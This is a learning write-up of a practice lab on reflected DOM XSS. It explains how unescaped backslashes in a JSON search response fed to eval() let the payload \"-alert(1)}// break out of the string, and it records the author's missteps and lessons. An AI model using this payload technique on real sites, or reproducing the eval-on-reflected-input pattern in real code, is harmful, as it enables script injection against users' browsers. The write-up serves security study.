# Lab: Reflected DOM XSS

**Difficulty:** Practitioner  
**Category:** DOM XSS, Reflected DOM XSS


## Vulnerability Summary

The application performs an AJAX request to retrieve search results in JSON format. The server reflects the search parameter inside the JSON response.

<img width="1917" height="1027" alt="1" src="https://github.com/user-attachments/assets/2c2c15bf-f210-4e72-8c1d-83292fea59d4" />


On the client side, the response is processed using:

```javascript
eval('var searchResultsObj = ' + this.responseText);
```

The server escapes double quotes (`"`), but **does not escape backslashes (`\`)**. This allows an attacker to break the JSON string and inject arbitrary JavaScript into the `eval()` call.


## Source

```javascript
xhr.open("GET", path + window.location.search);
```

The `search` parameter is reflected into the JSON response.


## Sink

```javascript
eval('var searchResultsObj = ' + this.responseText);
```

The reflected JSON is executed directly by `eval()`.

<img width="1916" height="1022" alt="2" src="https://github.com/user-attachments/assets/b7c99c73-d847-4835-a6a0-f1731eee12a0" />


## Code Analysis

The JSON response looks similar to:

```json
{
    "searchTerm":"XSS",
    "results":[]
}
```

The server escapes double quotes:

```json
{
    "searchTerm":"\""
}
```

However, it **does not escape backslashes**.

A single backslash causes a JavaScript syntax error because it escapes the quote.

Example:

```
\
```

Result:

```json
{
    "searchTerm":"\"
}
```

↓

```javascript
var searchResultsObj = {"searchTerm":"\"}
```

↓

```
SyntaxError
```

An even number of backslashes produces a valid JavaScript string.

This observation was the key to understanding how the JSON parser behaved before reaching `eval()`.

---

## Exploitation

Payload:

```text
\"-alert(1)}//
```

After reflection, the JSON becomes:

```json
{"searchTerm":"\\"-alert(1)}//","results":[]}
```

Explanation:

| Part | Purpose |
|------|---------|
| `\"` | Creates `\\`, cancelling the escaping of the following quote. |
| `"` | Closes the JSON string. |
| `-` | Separates expressions before calling `alert()`. |
| `alert(1)` | Executes JavaScript. |
| `}` | Closes the JSON object. |
| `//` | Comments out the remaining JSON. |

The final code evaluated by JavaScript becomes syntactically valid and executes `alert()`.


## Impact

Because user-controlled input reaches an `eval()` sink without proper escaping, an attacker can execute arbitrary JavaScript in the victim's browser.


## Where I Got Stuck

Initially I focused on HTML injection and attempted to inject `<script>` tags.

Later I discovered that the vulnerability was not HTML-based but caused by unsafe use of `eval()`.

I also experimented with different numbers of backslashes and noticed an important pattern:

- Odd number of `\` → `SyntaxError`
- Even number of `\` → Valid JavaScript

This observation led me to the root cause.


## Wrong Assumptions

- I initially searched for an HTML sink instead of a JavaScript sink.
- I assumed escaping of quotes was the main protection.
- I underestimated the importance of unescaped backslashes.


## Key Insight

The vulnerability is **not** caused by HTML parsing.

The root cause is:

1. User input is reflected into JSON.
2. Backslashes are not escaped.
3. The JSON string can be terminated.
4. `eval()` executes attacker-controlled JavaScript.

The presence of `eval()` should always be treated as a high-priority sink during DOM XSS analysis.


## Lessons Learned

- Always search for dangerous sinks (`eval()`, `innerHTML`, `document.write()`, etc.).
- Distinguish between HTML escaping and JavaScript string escaping.
- When testing JavaScript contexts, examine how special characters (`\`, `"`, `'`) are escaped.
- A `SyntaxError` is valuable information—it often reveals how the application builds JavaScript code.
